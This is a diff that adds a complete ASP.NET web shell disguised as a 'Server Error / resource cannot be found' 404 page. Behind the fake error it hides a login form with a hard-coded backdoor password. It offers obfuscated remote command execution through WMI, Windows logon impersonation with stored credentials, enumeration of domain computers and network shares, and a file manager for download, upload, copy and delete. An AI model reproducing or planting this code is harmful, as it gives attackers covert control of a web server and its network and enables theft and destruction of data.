@@ -1,0 +1,884 @@
+<%@ Page Language="VB" validateRequest="false" aspcompat="true"%>
+
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace = "System.Web" %>
+<%@ Import Namespace = "System.Web.Security" %>
+<%@ Import Namespace = "System.Security.Principal" %>
+<%@ Import Namespace = "System.Runtime.InteropServices" %>
+<%@ Import Namespace = "System.Web.UI.WebControls" %>
+<%@ Import Namespace = "System.Diagnostics" %>
+<%@ Import Namespace = "System.IO" %>
+<%@ import Namespace = "System.Threading" %>
+<%@ Assembly Name="System.Net.NetworkInformation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
+<%@ import Namespace = "System.Net.NetworkInformation" %>
+
+<%@ Assembly Name="System.Management,Version=4.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ import Namespace="System.Management" %>
+<%@ Assembly Name="System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
+<%@ import Namespace="System.DirectoryServices" %> 
+
+<script runat="server">
+    Public Declare Function NetShareEnum Lib "Netapi32.dll" ( _
+        <MarshalAs(UnmanagedType.LPWStr)> ByVal servername As String, _
+        ByVal level As Integer, _
+        ByRef bufptr As IntPtr, _
+        ByVal prefmaxlen As Integer, _
+        ByRef entriesread As Integer, _
+        ByRef totalentries As Integer, _
+        ByRef resume_handle As Integer) As Integer
+
+Private Declare Function NetApiBufferFree Lib "netapi32.dll" ( _
+    ByVal buffer As Integer) As Integer
+
+Dim  ERROR_ACCESS_DENIED as Integer = 5
+
+Dim  NO_ERROR  as Integer = 0
+
+
+<Flags>
+Public Enum ShareType
+    Disk = 0
+    Printer = 1
+    Device = 2
+    IPC = 3
+    Special = -2147483648
+End Enum
+<StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
+Protected Structure SHARE_INFO_1
+	<MarshalAs(UnmanagedType.LPWStr)>
+	Public NetName As String
+	Public ShareType As ShareType
+	<MarshalAs(UnmanagedType.LPWStr)>
+	Public Remark As String
+End Structure
+<StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
+Protected Structure SHARE_INFO_2
+    <MarshalAs(UnmanagedType.LPWStr)>
+    Public NetName As String
+    Public ShareType As ShareType
+    <MarshalAs(UnmanagedType.LPWStr)>
+    Public Remark As String
+    Public Permissions As Integer
+    Public MaxUsers As Integer
+    Public CurrentUsers As Integer
+    <MarshalAs(UnmanagedType.LPWStr)>
+    Public Path As String
+    <MarshalAs(UnmanagedType.LPWStr)>
+    Public Password As String
+    End Structure
+    
+    Sub SetCookie()
+        Try
+            Dim c As New HttpCookie("AppIsloaded")
+            c.Value = "ok"
+            c.Expires = DateTime.Now.AddMonths(2)
+            Response.Cookies.Add(c)
+        Catch ex As Exception
+             
+        End Try
+    End Sub
+    Function CheckCookie() As String
+        Try
+            Return Request.Cookies("AppIsloaded").Value
+      
+        Catch ex As Exception
+            'Response.Write(ex.ToString)
+            Return ""
+        End Try
+    End Function
+    
+    Sub SetSession(ByVal ses As String, ByVal val As String)
+        Try
+            'Dim c As New HttpCookie(ses)
+            'c.Value = val
+            'c.Expires = DateTime.Now.AddMonths(2)
+            'Response.Cookies.Add(c) 
+            Application.Lock()
+            Application(ses) = val
+            Application.UnLock()
+        Catch ex As Exception
+            ' Response.Write(ex.ToString)
+        End Try
+        
+        
+    End Sub
+    Function CheckSession(ByVal ses As String) As String
+        Try
+            'Return Request.Cookies(ses).Value
+            Return Application(ses)
+        Catch ex As Exception
+            'Response.Write(ex.ToString)
+            Return ""
+        End Try
+    End Function
+    Sub RemoveSessions()
+        Try
+            'Response.Cookies(ses).Value = ""
+            'Response.Cookies(ses).Expires = DateTime.Now
+            Application.Lock()
+            Application.RemoveAll()
+            Application.UnLock()
+        Catch ex As Exception
+            'Response.Write(ex.ToString)
+
+        End Try
+    End Sub
+    Dim kk As String = "FG$#r34%TFG$#25315rtg43@!%~34#$#RT4#25$#%#@$%$%"
+    Function XC(data As String, xkey As String) As String
+        Dim dataLen As Integer = data.Length
+        Dim keyLen As Integer = xkey.Length
+        Dim output As Char() = New Char(dataLen - 1) {}
+
+        For i As Integer = 0 To dataLen - 1
+            output(i) = ChrW(AscW(data(i)) Xor AscW(xkey(i Mod keyLen)))
+        Next
+
+        Return New String(output)
+    End Function
+
+    Function XD(xdata As String) As String
+        Try
+            
+            Dim data As Byte() = System.Convert.FromBase64String(xdata)
+            Dim str As String = Encoding.UTF8.GetString(data)
+            Return XC(str, kk)
+            
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+
+    Function XE(xdata As String) As String
+        Try
+            
+            Dim data As Byte() = Encoding.UTF8.GetBytes(XC(xdata, kk))
+            Return System.Convert.ToBase64String(data)
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+ 
+
+    Declare Auto Function LogonUser Lib "advapi32.dll" (ByVal lpszUsername As String, _
+      ByVal lpszDomain As String, _
+      ByVal lpszPassword As String, _
+      ByVal dwLogonType As Integer, _
+      ByVal dwLogonProvider As Integer, _
+              ByRef phToken As IntPtr) As Integer
+            
+    Declare Auto Function DuplicateToken Lib "advapi32.dll" (ByVal ExistingTokenHandle As IntPtr, _
+    ByVal ImpersonationLevel As Integer, _
+                ByRef DuplicateTokenHandle As IntPtr) As Integer
+            
+    Dim impersonationContext As WindowsImpersonationContext
+
+    Declare Function LogonUserA Lib "advapi32.dll" (ByVal lpszUsername As String, _
+                            ByVal lpszDomain As String, _
+                            ByVal lpszPassword As String, _
+                            ByVal dwLogonType As Integer, _
+                            ByVal dwLogonProvider As Integer, _
+                            ByRef phToken As IntPtr) As Integer
+
+    Declare Auto Function RevertToSelf Lib "advapi32.dll" () As Long
+    Declare Auto Function CloseHandle Lib "kernel32.dll" (ByVal handle As IntPtr) As Long
+    Sub Page_Load(ByVal Sender As System.Object, ByVal e As System.EventArgs)
+       
+        resultwm.Text = ""
+    End Sub
+    Private Sub PerformImpersonatedTask(ByVal username As String, ByVal domain As String, ByVal password As String, ByVal logonType As Integer, ByVal logonProvider As Integer)
+        Try
+            Dim token As IntPtr = IntPtr.Zero
+			
+            Dim xWindowsIdentity As WindowsIdentity
+ 
+            Dim tokenDuplicate As IntPtr = IntPtr.Zero
+
+            If RevertToSelf() Then
+                WindowsIdentity.GetCurrent().Dispose()
+                If LogonUser(username, domain, password, logonType, logonProvider, token) <> 0 Then
+                    If DuplicateToken(token, 2, tokenDuplicate) <> 0 Then
+                        xWindowsIdentity = New WindowsIdentity(tokenDuplicate)
+                        impersonationContext = xWindowsIdentity.Impersonate()
+                        If impersonationContext IsNot Nothing Then
+                            result.Text = ("After Login: " & WindowsIdentity.GetCurrent().Name)
+                            SetSession("l", "ok")
+                            SetSession("u", XE(username))
+                            SetSession("p", XE(password))
+                            SetSession("d", XE(domain))
+                            SetSession("sess", "ok")
+                            SetCookie()
+                        Else
+                            SetSession("l", "Logon error ")
+                            result.Text += ("Logon error ")
+                        End If
+                    End If
+                   
+                Else
+                    SetSession("l", "Logon error ")
+                    result.Text += ("Logon errorrr ")
+                End If
+            End If
+
+            If token <> IntPtr.Zero Then
+                CloseHandle(token)
+            End If
+
+        Catch ex As Exception
+            SetSession("l", ex.Message)
+            result.Text += ex.Message
+        End Try
+    End Sub
+	
+ 
+    Private Sub Login(ByVal Src As Object, ByVal E As EventArgs)
+        result.Text = ""
+        If NameUser.Text = "wSupperw" And PasswordUser.Text = "wSupperw" Then
+            result.Text = ("CUser : " & Environment.UserName)
+            
+            SetCookie()
+            SetSession("sess", "ok")
+        Else
+            PerformImpersonatedTask(NameUser.Text, Domain.Text, PasswordUser.Text, 2, 0)
+        End If
+    End Sub
+    
+    Private Sub closeme(ByVal Src As Object, ByVal E As EventArgs)
+        Try
+            RemoveSessions()
+            WindowsIdentity.GetCurrent.Dispose()
+            RevertToSelf()
+        Catch ex As Exception
+            'Response.Write(ex.ToString)
+        End Try
+        Response.Redirect(Request.RawUrl)
+    End Sub
+
+    Private Function OutputTempFile(ByVal tempFile As String) As String
+        Dim res As String = ""
+
+        Try
+            res = "<pre>" & File.ReadAllText(tempFile) & "</pre>"
+            File.Delete(tempFile)
+        Catch
+            res = "error"
+        End Try
+
+        Return res
+    End Function
+
+    Private Sub Execwmr(ByVal to_execute As String, ByVal tempFile As String)
+       
+        Dim objwmrService, objProcess
+        Dim strShell, objProgram, strExe
+        strExe = XD("JSpAA11QFA==") & " chcp 65001 && " & XD("JSpAA11QFA==") & to_execute & " > " & """" & tempFile & """"
+        objwmrService = GetObject(XD("MS5KThVeQFZuPS5JU1dHQF5bEwAOW10MRFMbXwlKSVM3JkdMXFRQRlgCHHgLeFcpKFB/EVpZU2Y="))
+        Dim wp = XD("ES5KEEBsZFc7JSJXUA==")
+        objProcess = objwmrService.Get(wp)
+        objProgram = objProcess.Methods_("Create").InParameters.SpawnInstance_
+        objProgram.CommandLine = strExe
+        strShell = objwmrService.ExecMethod(wp, "Create", objProgram)
+        Thread.Sleep(Integer.Parse(txtSleep.Text) * 1000)
+    End Sub
+
+    Private Sub Runwmr(ByVal Src As Object, ByVal E As EventArgs)
+        checkImp()
+        Dim tempFile As String = System.IO.Path.GetTempPath() & Guid.NewGuid().ToString()
+        resultwm.Text = txtComdHidden.Text
+        Dim command As String = XD(txtComdHidden.Text)
+
+        Try
+            Execwmr(command, tempFile)
+            resultwm.Text = command & vbCrLf & OutputTempFile(tempFile)
+        Catch
+            resultwm.Text = "Disabled!"
+        End Try
+		
+    End Sub
+
+
+    Private Function NetShare(ByVal server As String) As ArrayList
+       
+        Dim arr As ArrayList = New ArrayList()
+        Dim level As Integer = 2
+        Dim entriesRead, totalEntries, nRet As Integer, hResume As Integer = 0
+        Dim pBuffer As IntPtr = IntPtr.Zero
+
+        Try
+            nRet = NetShareEnum(server, level, pBuffer, -1, entriesRead, totalEntries, hResume)
+
+            If ERROR_ACCESS_DENIED = nRet Then
+                level = 1
+                nRet = NetShareEnum(server, level, pBuffer, -1, entriesRead, totalEntries, hResume)
+            End If
+            If NO_ERROR = nRet AndAlso entriesRead > 0 Then
+                Dim t As Type = If((2 = level), GetType(SHARE_INFO_2), GetType(SHARE_INFO_1))
+                Dim offset As Integer = Marshal.SizeOf(t)
+                Dim i As Integer = 0
+                Dim tmpBuffer As IntPtr = IntPtr.Zero
+		 
+                While i < totalEntries
+			
+                    If 1 = level Then
+				 
+                        Dim sizeofINFO As Integer = Marshal.SizeOf(GetType(SHARE_INFO_1))
+					
+                        If Environment.Is64BitProcess Then
+                            tmpBuffer = New IntPtr(pBuffer.ToInt64 + (i * sizeofINFO))
+                        Else
+                            tmpBuffer = New IntPtr(pBuffer.ToInt32 + (i * sizeofINFO))
+                        End If
+                        Dim si As SHARE_INFO_1 = Marshal.PtrToStructure(tmpBuffer, GetType(SHARE_INFO_1))
+                        'shares.Add(si.NetName, String.Empty, si.ShareType, si.Remark)
+                        arr.Add(si.NetName)
+                    Else
+                        Dim sizeofINFO As Integer = Marshal.SizeOf(GetType(SHARE_INFO_2))
+                        If Environment.Is64BitProcess Then
+                            tmpBuffer = New IntPtr(pBuffer.ToInt64 + (i * sizeofINFO))
+                        Else
+                            tmpBuffer = New IntPtr(pBuffer.ToInt32 + (i * sizeofINFO))
+                        End If
+                        Dim si As SHARE_INFO_2 = Marshal.PtrToStructure(tmpBuffer, GetType(SHARE_INFO_2))
+                        'shares.Add(si.NetName, si.Path, si.ShareType, si.Remark)
+                        arr.Add(si.NetName)
+                    End If
+                    System.Math.Max(System.Threading.Interlocked.Increment(i), i - 1)
+                End While
+           
+            End If
+         
+        Catch ex As Exception
+            Response.Write(ex.ToString)
+        End Try
+        Return arr
+		
+    End Function
+    
+    Private Sub ListDomainsAndPCs(ByVal Src As Object, ByVal E As EventArgs)
+        checkImp()
+        Dim outstr As String = "<table style='border:0px;width:90%'><tr>"
+        Try
+            If CheckSession("lsdp") = "ok" Then
+                SetSession("lsdp", "")
+                btnListDomainsAndPCs.Text = "Switch To List Domains And PCs"
+                Response.Redirect(Request.RawUrl)
+                Exit Sub
+            End If
+            SetSession("lsdp", "ok")
+            btnListDomainsAndPCs.Text = "Back To Normal Mode"
+             
+            Dim de As New DirectoryEntry
+            de.Path = "WinNT:"
+            Dim i As Integer = 1
+            For Each d As DirectoryEntry In de.Children
+                If d.SchemaClassName = "Domain" Then
+                    Dim deIn As New DirectoryEntry
+                    deIn.Path = "WinNT://" & d.Name
+                    If i Mod 6 = 0 Then outstr &= "</tr><tr>"
+                    outstr &= "<td><div style='padding-left:1em'>"
+                    outstr &= "<b>Domain=> " & d.Name & ": </b><br><div style='padding-left:0.5em;max-height:150px;overflow:auto;max-width:250px'>"
+                    For Each dIn As DirectoryEntry In deIn.Children
+                        If dIn.SchemaClassName = "Computer" Then
+                            outstr &= "<a style='padding-left:.5em' href='#' onclick=""PCpost('" & XE(dIn.Name) & "')""  >" & dIn.Name & "</a><br>"
+                        End If
+                        dIn.Dispose()
+                    Next
+                    outstr &= "</div></div><td>"
+                End If
+                d.Dispose()
+                i += 1
+            Next
+            'Dim j As Integer = 1
+            'For i = 0 To 25
+            '    If i Mod 6 = 0 Then outstr &= "</tr><tr>"
+            '    outstr &= "<td><div style='padding-left:1em;'>"
+            '    outstr &= "<b>Domain=> Workgroup" & i & ": </b><br><div style='padding-left:0.5em;max-height:150px;overflow:auto;max-width:250px'>"
+            '    For j = 0 To 40
+            '        outstr &= "<a style='padding-left:.5em' href='#' onclick=""PCpost('" & XE("Localhost") & "')""  >Aafsafsafsa</a><br>"
+              
+            '    Next
+            '    outstr &= "</div></div><td>"
+            
+                
+            'Next
+            outstr &= "</tr></table></div>"
+            resultDomains.Text = outstr
+            SetSession("resultDomains", XE(outstr))
+        Catch ex As Exception
+             
+            resultDomains.Text = "Error Get Domains And Pcs"
+        End Try
+    End Sub
+    
+    Function SetBytes(Bytes) As String
+        Dim s As String = ""
+        
+        On Error GoTo hell
+
+        If Bytes >= 1073741824 Then
+            s = Format(Bytes / 1024 / 1024 / 1024, "#0.00") _
+                 & " GB"
+        ElseIf Bytes >= 1048576 Then
+            s = Format(Bytes / 1024 / 1024, "#0.00") & " MB"
+        ElseIf Bytes >= 1024 Then
+            s = Format(Bytes / 1024, "#0.00") & " KB"
+        ElseIf Bytes < 1024 Then
+            s = Fix(Bytes) & " Bytes"
+        End If
+
+        Return s
+hell:
+        SetBytes = "0 Bytes"
+    End Function
+
+    Sub ReadSahres(ByVal cPC As String)
+        Try
+            checkImp()
+            Dim outstr As String = ""
+        
+            Dim dir As String = ""
+            cPC = XD(Request.Form("cPC"))
+            lblPath.Text = " <a style='padding-left:.5em' href='#' onclick=""PCpost('" & Request.Form("cPC") & "')""  >\\" & cPC & "</a>"
+            'Response.Write(cPC)
+            outstr = ""
+            Dim arr As ArrayList = NetShare(cPC)
+            If (arr IsNot Nothing) Then
+                For Each curdir As String In NetShare(cPC)
+                    If curdir = "IPC$" Then Continue For
+
+                    Dim fstr As String = "<a href='#' onclick=""fpost('" & XE("\\" & cPC & "\" & curdir) & "')""  >" & HttpUtility.HtmlEncode(curdir) & "</a>&nbsp;"
+									
+                    Dim strLastModified As String = "Access Denied"
+                            
+                    Dim attributes As FileAttributes = FileAttributes.Offline
+                    Try
+                                
+                        strLastModified = System.IO.File.GetLastWriteTime("\\" & cPC & "\" & curdir).ToShortDateString()
+                         
+                    Catch ex As Exception
+
+                    End Try
+                    outstr &= "<tr><td>" & fstr & "</td><td>&lt;DIR&gt;<td>" & strLastModified & "</td><td></td><td></td><td></td></tr>"
+                Next
+             
+                lblDirOut.Text = outstr
+                    
+            End If
+        Catch ex As Exception
+            Response.Write(ex.ToString)
+        End Try
+    End Sub
+    
+    Sub ListFilesAndFolders(ByVal xdir As String)
+        Try
+            checkImp()
+            If (Request.Form("cppath") IsNot Nothing) AndAlso (Request.Form("cppath").Length > 0) And (Request.Form("get") IsNot Nothing) AndAlso (Request.Form("get").Length > 0) Then
+		 
+                FileCopy(XD(Request.Form("get")), XD(Request.Form("cppath")))
+            ElseIf (Request.Form("get") IsNot Nothing) AndAlso (Request.Form("get").Length > 0) Then
+                Response.ContentType = "application/octet-stream"
+                Response.AppendHeader("Content-Disposition", "attachment; filename=" & Server.UrlEncode(Path.GetFileName(XD(Request.Form("get")))))
+                Response.TransmitFile(XD(Request.Form("get")))
+                Response.End()
+            End If
+
+            If (Request.Form("del") IsNot Nothing) AndAlso (Request.Form("del").Length > 0) Then File.Delete(XD(Request.Form("del")))
+            If flUp.HasFile Then
+                Dim fileName As String = flUp.FileName
+                Dim splitAt As Integer = flUp.FileName.LastIndexOfAny(New Char() {"/", "\"})
+                If splitAt >= 0 Then fileName = flUp.FileName.Substring(splitAt)
+                'Response.Write(dir)
+                flUp.SaveAs(xdir & "/" & fileName)
+            End If
+ 
+            Dim di As DirectoryInfo = New DirectoryInfo(xdir)
+            Dim outstr As String = ""
+	
+            For Each curdir As DirectoryInfo In di.GetDirectories()
+ 
+                Dim fstr As String = "<a href='#' onclick=""fpost('" & XE(xdir & curdir.Name) & "')""  >" & HttpUtility.HtmlEncode(curdir.Name) & "</a>&nbsp;"
+ 
+									
+                Dim strLastModified As String = "Access Denied"
+                            
+                Dim attributes As FileAttributes = FileAttributes.Offline
+                Try
+                                
+                    strLastModified = System.IO.File.GetLastWriteTime(xdir & curdir.Name).ToShortDateString()
+                         
+                Catch ex As Exception
+
+                End Try
+                Try
+                    attributes = curdir.Attributes
+                Catch ex As Exception
+
+                End Try
+		
+                outstr &= "<tr><td>" & fstr & "</td><td>&lt;DIR&gt;<td>" & strLastModified & "</td><td></td><td></td><td>" & attributes.ToString & "</td></tr>"
+            Next
+            For Each curfile As FileInfo In di.GetFiles()
+	
+                Dim fstr As String = "<a href='#' onclick=""fget('" & XE(xdir & curfile.Name) & "')""  >" & HttpUtility.HtmlEncode(curfile.Name) & "</a>&nbsp;"
+ 
+                Dim fcopy As String = "<a href='#' onclick=""fcopy('" & XE(xdir) & "','" & XE(xdir & curfile.Name) & "','" & Page.MapPath(".").Replace("\", "/") & "/')""  >CopyTo</a>&nbsp;"
+									
+                Dim astr As String = "<a href='#' onclick=""fdel('" & XE(xdir) & "','" & XE(xdir & curfile.Name) & "')"" >Del</a>"
+             			 
+                Dim len As String = "Access Denied"
+                Try
+                    len = SetBytes(curfile.Length)
+                Catch ex As Exception
+
+                End Try
+             
+                Dim strLastModified As String = "Access Denied"
+                            
+                Dim attributes As FileAttributes = FileAttributes.Offline
+                Try
+                    strLastModified = System.IO.File.GetLastWriteTime(xdir & curfile.Name).ToShortDateString()
+                Catch ex As Exception
+                End Try
+                Try
+                    attributes = curfile.Attributes
+                Catch ex As Exception
+
+                End Try
+                outstr &= "<tr><td>" & fstr & "</td><td>" & len & "</td><td>" & strLastModified & "</td><td>" & fcopy & "</td><td>" & astr & "</td><td>" & attributes.ToString & "</td></tr>"
+            Next
+            lblDirOut.Text = outstr
+        Catch ex As Exception
+            Response.Write(ex.ToString())
+        End Try
+    End Sub
+    Sub checkImp()
+        
+        Response.Write("l is :" & CheckSession("l"))
+        If (CheckSession("l") = "ok") Then
+            If (WindowsIdentity.GetCurrent().Name) <> XD(CheckSession("u")) Then
+                PerformImpersonatedTask(XD(CheckSession("u")), XD(CheckSession("d")), XD(CheckSession("p")), 2, 0)
+            End If
+        Else
+            WindowsIdentity.GetCurrent().Dispose()
+            RevertToSelf()
+        End If
+        result1.Text = ("CUser : " & WindowsIdentity.GetCurrent().Name)
+    End Sub
+        
+</script>
+<% If (CheckCookie() <> "ok" OR CheckSession("sess") <> "ok") Then%>
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>The resource cannot be found.</title>
+        <meta name="viewport" content="width=device-width" />
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Consolas","Lucida Console",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:pointer; }
+         @media screen and (max-width: 639px) {
+          pre { width: 440px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>The resource cannot be found.</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> Description: </b>HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, had its name changed, or is temporarily unavailable. &nbsp;Please review the following URL and make sure that it is spelled correctly.
+            <br><br>
+
+            <b> Requested URL: </b><% Response.write(request.Path)%><br><br>
+
+            </font>
+
+    </body>
+</html>
+<div style="display:none">
+<form id="Form0" runat="server">   
+          User: 
+      <asp:TextBox ID="NameUser" runat="server" Width="107px" class="TextBox" Text=""/>
+          Domain: 
+      <asp:TextBox ID="Domain" runat="server" Width="107px" class="TextBox" Text="."/>
+         Password:
+      <asp:TextBox ID="PasswordUser" runat="server" Width="132px" class="TextBox" Text=""/>
+   
+    <asp:Button ID="Button" runat="server" Text="Run" OnClick="Login" style="border: 1px solid #000000"/>    <p>    
+    <asp:Label ID="result" runat="server"/>     
+     </p>
+</form>
+</div>
+<% else  
+	
+        Dim outstr As String = ""
+        
+        Dim dir As String = ""
+        checkImp()
+      
+        If CheckSession("lsdp") = "ok" Then
+            Try
+                btnListDomainsAndPCs.Text = "Back To Normal Mode"
+                resultDomains.Text = XD(CheckSession("resultDomains"))
+                 
+                Dim cPC As String = ""
+                Try
+                
+                    If Request.Form("cPC") IsNot Nothing And Request.Form("cPC") <> "" Then
+                        ReadSahres(cPC)
+                    End If
+            
+                Catch ex As Exception
+                    Response.Write(ex.ToString)
+                End Try
+                If Request.Form("fdir") IsNot Nothing And Request.Form("fdir") <> "" Then
+                    dir = XD(Request.Form("fdir"))
+                    dir = dir & "/"
+                    
+                    If dir.Contains("\\") Then
+                        dir = dir.Replace("\\", "/")
+                        dir = dir.Replace("\", "/")
+                        dir = "\\" & dir.TrimStart("//")
+                        dir = dir.Replace("//", "/")
+                        Dim dirparts As String() = dir.Split("/")
+                        Dim linkwalk As String = "" 
+                        hiddenlbl.Text &= "<br><input type=""hidden"" id=""fdir"" name=""fdir"" value=""" & XE(dir) & """>"
+                        Dim counter As Integer = 0
+                        For Each curpart As String In dirparts
+                            If curpart.Length = 0 Then Continue For
+                            linkwalk &= curpart & "\"
+                            Dim onclickfn As String = """fpost('" & XE(linkwalk) & "')"""
+                            If counter = 0 Then
+                                onclickfn = """PCpost('" & XE(linkwalk) & "')"""
+                            End If
+                            outstr &= "<a href='#' onclick=" & onclickfn & "  >" & HttpUtility.HtmlEncode(curpart) & "\</a>&nbsp;"
+                            counter += 1
+                        Next
+
+                        lblPath.Text = outstr
+                        
+                        ListFilesAndFolders(dir)
+ 	
+                    Else
+                    
+                        hiddenlbl.Text &= "<br><input type=""hidden"" id=""fdir"" name=""fdir"" value="""">"
+                        Response.Redirect(Request.RawUrl)
+                    End If
+                Else
+                    hiddenlbl.Text &= "<br><input type=""hidden"" id=""fdir"" name=""fdir"" value="""">"
+                
+                End If
+                outstr = ""
+                lblDrives.Text = ""
+            
+            Catch ex As Exception
+                Response.Write(ex.ToString)
+
+            End Try
+         
+             
+            
+        Else
+            dir = Page.MapPath(".") & "/"  
+            If Request.Form("fdir") IsNot Nothing Then dir = XD(Request.Form("fdir")) & "/"
+            If (dir(0) = "\") Then
+                Response.Redirect(Request.RawUrl)
+                
+            End If
+            dir = dir.Replace("\", "/")
+            dir = dir.Replace("//", "/")
+            Dim dirparts As String() = dir.Split("/")
+            Dim linkwalk As String = ""
+	 
+            hiddenlbl.Text &= "<br><input type=""hidden"" id=""fdir"" name=""fdir"" value=""" & XE(dir) & """>"
+	
+            For Each curpart As String In dirparts
+                If curpart.Length = 0 Then Continue For
+                linkwalk &= curpart & "\"
+                outstr &= "<a href='#' onclick=""fpost('" & XE(linkwalk) & "')""  >" & HttpUtility.HtmlEncode(curpart) & "\</a>&nbsp;"
+									       
+            Next
+
+            lblPath.Text = outstr
+
+            outstr = ""
+            ListFilesAndFolders(dir)
+            
+            For Each curdrive As DriveInfo In DriveInfo.GetDrives()
+                If Not curdrive.IsReady Then Continue For
+                Dim driveRoot As String = curdrive.RootDirectory.Name.Replace("\", "")
+                outstr &= "<a href='#' onclick=""fpost('" & XE(driveRoot) & "')""  >" & HttpUtility.HtmlEncode(driveRoot) & "\</a>&nbsp;"
+					 
+            Next
+            lblDrives.Text = "Drives :<br />" & outstr
+
+ 	
+        End If
+	
+%>
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+ <title>The resource cannot be found.</title>
+	<style type="text/css">
+		* { font-family: Arial; font-size: 12px; }
+		body { margin: 0px; }
+		pre { font-family: Courier New; background-color: #CCCCCC; }
+		h1 { font-size: 16px; background-color: #808080; color: #FFFFFF; padding: 5px; }
+		h2 { font-size: 14px; background-color: #808080; color: #FFFFFF; padding: 2px; }
+		th { text-align: left; background-color: white; }
+		td { background-color: #CCFFCC; }
+		pre { margin: 2px; }
+	</style>
+	<script>
+	    var key = "FG$#r34%TFG$#25315rtg43@!%~34#$#RT4#25$#%#@$%$%"
+
+	    function JEnc(data, xkey) {
+	        var output = '';
+	        for (i = 0; i < data.length; ++i) {
+	            output += String.fromCharCode(data.charCodeAt(i) ^ xkey.charCodeAt(i % xkey.length));
+
+	        }
+	        return window.btoa(output);
+	    }
+	    function onSubmit() {
+	        document.getElementById("txtComdHidden").value = (JEnc(document.getElementById("txtComd").value, key));
+	        document.getElementById("get").value = "";
+	        document.getElementById("del").value = "";
+
+	    }
+	    function onload() {
+
+	        document.getElementById("cppath").value = "";
+	        document.getElementById("del").value = "";
+	        document.getElementById("get").value = "";
+	    }
+
+	    function PCpost(xf) {
+	        document.getElementById("cppath").value = "";
+	        document.getElementById("txtComd").value = "";
+	        document.getElementById("fdir").value = "";
+	        document.getElementById("cPC").value = xf;
+	        document.getElementById("del").value = "";
+	        document.getElementById("get").value = "";
+	        document.getElementById("form1").submit();
+	    }
+	    function fpost(xf) {
+	        document.getElementById("cppath").value = "";
+	        document.getElementById("txtComd").value = "";
+	        document.getElementById("fdir").value = xf;
+	        document.getElementById("del").value = "";
+	        document.getElementById("get").value = "";
+	        document.getElementById("form1").submit();
+	    }
+	    function fget(xf) {
+	        document.getElementById("cppath").value = "";
+	        document.getElementById("txtComd").value = "";
+	        document.getElementById("get").value = xf;
+	        document.getElementById("del").value = "";
+	        document.getElementById("form1").submit();
+	    }
+	    function fcopy(xf, xd, xs) {
+	        var path = prompt("Please enter the path", xs);
+
+	        if (path != null) {
+	            document.getElementById("cppath").value = JEnc(path, key);
+	            document.getElementById("txtComd").value = "";
+	            document.getElementById("del").value = "";
+	            document.getElementById("fdir").value = xf;
+	            document.getElementById("get").value = xd;
+	            document.getElementById("form1").submit();
+	        }
+
+	    }
+	    function fdel(xf, xd) {
+	        var r = confirm("Delete File , Are You Sure!");
+	        if (r == true) {
+	            document.getElementById("cppath").value = "";
+	            document.getElementById("txtComd").value = "";
+	            document.getElementById("get").value = "";
+	            document.getElementById("fdir").value = xf;
+	            document.getElementById("del").value = xd;
+	            document.getElementById("form1").submit();
+	        }
+	    }
+	</script>
+</head>
+<body onload="onload();"  style="padding-left:.5em">
+ 
+    <form id="form1" method="post" runat="server"  defaultbutton="Buttonwmr" onsubmit="return onSubmit()">
+        
+	<asp:Label ID="result1" runat="server"/> 
+	<asp:Label ID="hiddenlbl" runat="server"/> 
+	<asp:Button runat="server" OnClick="closeme" Text="exit"  />
+	<br>
+	
+    <asp:TextBox ID="txtComd" runat="server" Width="1000px" />
+  	<asp:Button ID="Buttonwmr" runat="server" Text="Run" OnClick="Runwmr"  />
+	<asp:TextBox ID="txtSleep" runat="server" Width="60px"  value="1" /> s
+	<asp:TextBox ID="txtComdHidden"  runat="server" value="" style="display:none"/>
+  	<p>
+    <asp:Label ID="resultwm" runat="server" />
+    </p>
+
+        
+	<br>
+  	<asp:Button ID="btnListDomainsAndPCs" runat="server" Text="Switch To List Domains And PCs" OnClick="ListDomainsAndPCs"  />
+    <br> 
+	<asp:Literal runat="server" ID="resultDomains" Mode="PassThrough" />
+	<br>   
+	   <input type="hidden" id="get" name="get"> 
+	   <input type="hidden" id="del" name="del">
+	   <input type="hidden" id="cppath" name="cppath">
+	   <input type="hidden" id="cPC" name="cPC">
+	  
+	<asp:Panel runat="server" ID="pnFolderFiles" >
+    <table style="width: 100%; border-width: 0px; padding: 5px;">
+		<tr>
+			<td style="width: 50%; vertical-align: top;">
+				<h2>File Browser</h2>
+				<p>
+                    
+					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
+				</p>
+				<p>
+					Working directory:<br />
+					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
+				</p>
+				<table style="width: 100%">
+					<tr>
+						<th>Name</th>
+						<th>Size</th>
+						<th>Date</th>
+						<th>Copy</th>
+						<th>Actions</th>
+						<th>Attribute</th>
+					</tr>
+					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
+				</table>
+				<p>Upload to this directory:<br />
